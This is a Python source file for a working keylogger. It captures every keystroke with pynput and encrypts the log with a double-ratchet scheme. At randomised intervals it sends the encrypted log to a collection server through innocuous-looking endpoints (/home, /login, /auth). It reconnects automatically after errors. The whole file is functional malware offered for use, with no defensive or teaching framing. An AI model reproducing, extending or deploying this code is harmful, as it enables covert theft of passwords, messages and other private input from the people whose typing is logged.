#!/usr/bin/env python3
from pynput import keyboard
from threading import Timer
from time import sleep
import double_ratchet
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import dh
from cryptography.hazmat.backends import default_backend
import requests
import random
import sys
import base64


# constants
SEND_URL = "/home"
KEY_URL = "/login"
SERVER_KEY = "/auth"
INTERVAL_SEND = 10
SERVER_IP = "localhost"
SERVER_PORT = 8000
EXCHANGE_MSG_MAX = 3
USE_POST = True

# global variables
exchanged_msgs = 0


class Keylogger:

    def __init__(self, interval, ip, port):
        self.interval = interval
        self.ip = ip
        self.port = port
        self.log = ""
        self.__r = double_ratchet.Ratchet()
        self.__start_connection()
        self.__pair_pkey()
        
    def __start_connection(self):
        # send public key in Session Header to pair the connection
        key = self.__r.getPublicKey()
        headers = {'Session': base64.b64encode(key)}
        _ = requests.get('http://' + SERVER_IP + ':' + str(SERVER_PORT) + KEY_URL, headers=headers)

    def __pair_pkey(self):
        global exchanged_msgs
        # update the public key of the server
        sleep(3)
        r = requests.get('http://' + SERVER_IP + ':' + str(SERVER_PORT) + SERVER_KEY)
        pubkey = bytes(r.text, 'ascii')
        dhpub: dh.DHPublicKey = serialization.load_pem_public_key(pubkey, backend=default_backend())
        self.__r.pairComm(dhpub)

    # function to add the pressed keys to the current ones
    def __append_to_log(self, string):
        self.log = self.log + string

    # process the pressed key
    def __process_pressed_key(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.tab:
                current_key = "\t"
            elif key == key.enter:
                current_key = "\n"
            else:
                current_key = "<" + str(key) + ">"
        self.__append_to_log(current_key)

    def __send_2_server(self):
        # if no keys were pressed, do nothing
        if self.log != "":
            global exchanged_msgs
            message = self.log
            # encrypt the pressed keys
            cipher = self.__r.encrypt(message)
            b64_cipher = base64.b64encode(cipher)
            # send the encrypted keys to the server
            if USE_POST:
                _ = requests.post('http://' + SERVER_IP + ':' + str(SERVER_PORT) + SEND_URL, data=b64_cipher)
            else:
                headers = {'Session': b64_cipher}
                _ = requests.get('http://' + SERVER_IP + ':' + str(SERVER_PORT) + SEND_URL, headers=headers)
            exchanged_msgs += 1
            if exchanged_msgs == EXCHANGE_MSG_MAX:
                exchanged_msgs = 0
                self.__pair_pkey()
                key = self.__r.getPublicKey()
                headers = {'Session': base64.b64encode(key)}
                _ = requests.get('http://' + SERVER_IP + ':' + str(SERVER_PORT) + KEY_URL, headers=headers)

    # function to send the user input in the given interval
    def __report(self):
        r = random.randint(0, 10)
        self.__send_2_server()
        self.log = ""
        timer = Timer(self.interval+r, self.__report)
        timer.start()
        # cada cierto tiempo hay que actualizar mover el ratchet del servidor!!!

    def start(self):
        # listening 2 the user input
        self.__keyboard_listener = keyboard.Listener(on_press=self.__process_pressed_key)
        with self.__keyboard_listener:
            # starts sending keys to server
            try:
                self.__report()
            except ConnectionError:
                self.__keyboard_listener.join()
            # waiting the listener to finish
            self.__keyboard_listener.join()
    
    def exit(self):
        self.__keyboard_listener.stop()
        requests.get('http://' + SERVER_IP + ':' + str(SERVER_PORT) + '/logout')


random.seed(10)
keylogger = None
while (True):
    try:
        # adding a print interval of a min of 5 seconds
        keylogger = Keylogger(INTERVAL_SEND, SERVER_IP, SERVER_PORT)
        # starting the keyloggger
        keylogger.start()
    except ConnectionError as e:
        print(e)
        sleep(3)
        continue
    except KeyboardInterrupt:
        keylogger.exit()
        sys.exit(0)
    except Exception as e:
        if keylogger is not None:
            keylogger.exit()
